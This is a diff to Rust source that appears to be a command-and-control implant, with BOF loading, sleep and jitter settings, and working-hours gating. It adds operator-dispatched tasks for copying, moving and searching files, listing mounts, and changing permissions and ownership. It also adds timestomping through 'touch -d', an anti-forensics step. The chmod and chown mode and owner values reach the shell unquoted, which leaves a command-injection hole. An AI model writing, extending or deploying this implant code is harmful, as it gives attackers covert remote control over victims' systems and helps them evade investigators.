@@ -102,6 +102,14 @@ fn bof_store_unload(name: &str) -> String {
 pub static DYN_SLEEP_SEC:  AtomicU64 = AtomicU64::new(u64::MAX);
 pub static DYN_JITTER_PCT: AtomicU64 = AtomicU64::new(u64::MAX);
 
+fn shell_quote(s: &str) -> String {
+    if cfg!(target_os = "windows") {
+        format!("\"{}\"", s.replace('"', "\\\""))
+    } else {
+        format!("'{}'", s.replace('\'', "'\\''"))
+    }
+}
+
 static DYN_WORKING_HOURS: OnceLock<Mutex<String>> = OnceLock::new();
 fn dyn_working_hours() -> std::sync::MutexGuard<'static, String> {
     DYN_WORKING_HOURS.get_or_init(|| Mutex::new(String::new())).lock().unwrap()
@@ -1524,6 +1532,58 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
                 Ok(_) => t.send_result(task.id, "[+] removed", ""),
                 Err(e) => t.send_result(task.id, "", &format!("rm: {}", e)),
             }
+        }
+        "CP" | "MV" => {
+            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
+            let src = j.get("src").and_then(|v| v.as_str()).unwrap_or("");
+            let dst = j.get("dst").and_then(|v| v.as_str()).unwrap_or("");
+            if src.is_empty() || dst.is_empty() {
+                t.send_result(task.id, "", "usage: {src,dst}");
+            } else {
+                let result = if typ == "CP" {
+                    std::fs::copy(src, dst).map(|_| ())
+                } else {
+                    std::fs::rename(src, dst)
+                };
+                match result {
+                    Ok(_) => t.send_result(task.id, &format!("[+] {} {} → {}", typ.to_lowercase(), src, dst), ""),
+                    Err(e) => t.send_result(task.id, "", &format!("{}: {}", typ.to_lowercase(), e)),
+                }
+            }
+        }
+        "GREP" => {
+            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
+            let pattern = j.get("pattern").and_then(|v| v.as_str()).unwrap_or("");
+            let path = j.get("path").and_then(|v| v.as_str()).unwrap_or(".");
+            if pattern.is_empty() {
+                t.send_result(task.id, "", "usage: {pattern,path}");
+            } else {
+                #[cfg(target_os = "windows")]
+                let cmd = format!(r#"findstr /spin /c:"{}" "{}" 2>&1"#, pattern.replace('"', ""), path.replace('"', ""));
+                #[cfg(not(target_os = "windows"))]
+                let cmd = format!("grep -R -n -- {} {} 2>&1", shell_quote(pattern), shell_quote(path));
+                t.send_result(task.id, &shell(&cmd), "");
+            }
+        }
+        "MOUNT" => {
+            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
+            let path = j.get("path").and_then(|v| v.as_str()).unwrap_or("");
+            let cmd = if path.is_empty() { "mount".to_string() } else { format!("mount {}", shell_quote(path)) };
+            t.send_result(task.id, &shell(&cmd), "");
+        }
+        "CHMOD" | "CHOWN" | "CHTIMES" => {
+            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
+            let path = j.get("path").and_then(|v| v.as_str()).unwrap_or("");
+            let cmd = match typ.as_str() {
+                "CHMOD" => format!("chmod {} {} 2>&1", j.get("mode").and_then(|v| v.as_str()).unwrap_or(""), shell_quote(path)),
+                "CHOWN" => format!("chown {}{} {} 2>&1", j.get("owner").and_then(|v| v.as_str()).unwrap_or(""),
+                    j.get("group").and_then(|v| v.as_str()).map(|g| format!(":{}", g)).unwrap_or_default(), shell_quote(path)),
+                _ => format!("touch -d {} {} 2>&1", shell_quote(j.get("mtime").and_then(|v| v.as_str()).unwrap_or("")), shell_quote(path)),
+            };
+            #[cfg(target_os = "windows")]
+            t.send_result(task.id, "", &format!("{}: not supported on Windows", typ.to_lowercase()));
+            #[cfg(not(target_os = "windows"))]
+            t.send_result(task.id, &shell(&cmd), "");
         }
         "ENV" => {
             let out = std::env::vars()
